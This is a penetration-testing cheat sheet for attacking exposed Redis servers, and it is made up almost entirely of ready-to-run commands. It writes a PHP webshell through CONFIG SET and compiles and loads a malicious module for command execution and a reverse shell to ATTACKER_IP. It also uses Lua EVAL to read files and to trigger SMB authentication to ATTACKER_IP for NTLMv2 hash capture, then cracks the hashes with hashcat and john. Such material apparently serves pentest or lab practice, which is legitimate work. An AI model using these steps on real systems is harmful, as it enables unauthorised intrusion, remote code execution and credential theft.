## CHECKS

```md
# Check if Redis is exposed (6379)
# Check if authentication is required
# Enumerate server info
# Dump keys from databases
# Check writable directories
# Attempt webshell write
# Check module load capability
```
## NMAP ENUMERATION

```bash
sudo nmap -p 6379 -sV --script redis-info $ip
```
## CONNECT & ENUMERATION

```bash
# Install redis-cli
sudo apt install redis-tools -y

# Connect
redis-cli -h $ip
```
### BASIC COMMANDS

```bash
# Get server info & statistics
INFO

# Get all configuration
CONFIG GET *

# Check if password is set
CONFIG GET requirepass

# Select database
SELECT 0
SELECT 1

# List all keys
KEYS *
```
## IMPORTANT FILES (On Target)

```md
Redis config file:
- /etc/redis/redis.conf

Systemd service:
- /etc/systemd/system/redis.service
```
## UPLOAD WEBSHELL (If No Auth & Writable Dir)

⚠ Requires:

- No authentication OR valid credentials
    
- Writable directory
    
- Directory accessible via web server
    

```bash
CONFIG SET dir /opt/redis-files
CONFIG SET dbfilename redis.php
SET test "<?php system($_GET['cmd']);?>"
SAVE
```

Now access:

```
http://target/redis.php?cmd=id
```

## LOAD MODULE EXPLOIT (RCE)

### 1️⃣ Compile Malicious Module

```bash
git clone https://github.com/binaryxploit/redis-module-load-cmd-exec.git
cd redis-module-load-cmd-exec
make
```
### 2️⃣ Upload module.so (Example via FTP)

```bash
ftp> put module.so
# Example upload path:
/var/ftp/pub/module.so
```
### 3️⃣ Load Module via redis-cli

```bash
MODULE LOAD /var/ftp/pub/module.so

# Verify loaded modules
MODULE LIST

# Execute command
system.exec "id"

# Reverse shell
system.rev ATTACKER_IP PORT
```
## REDIS 2.8.2402 – WINDOWS ABUSE

Redis allows Lua script execution via `EVAL`.

```bash
# Execute Lua to read file
EVAL "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
```
### Capture NTLMv2 Hash

```bash
# Start Responder
sudo responder -I tun0

# Trigger SMB auth
EVAL "dofile('//ATTACKER_IP/test')" 0
```
### Crack Hash

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ntlmv2-hash
```
## REDIS 4.x / 5.x – RCE TOOLS

```md
https://github.com/Ridter/redis-rce
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
https://github.com/binaryxploit
```
## NOTES

```md
- Default port: 6379
- No authentication = critical exposure
- Runs as root in many misconfigured systems
- CONFIG SET dir allows arbitrary file write
- MODULE LOAD enables full RCE
- Common in Docker environments
```
## REFERENCE

```md
http://michalszalkowski.com/security/pentesting-ports/6379-redis/
https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
```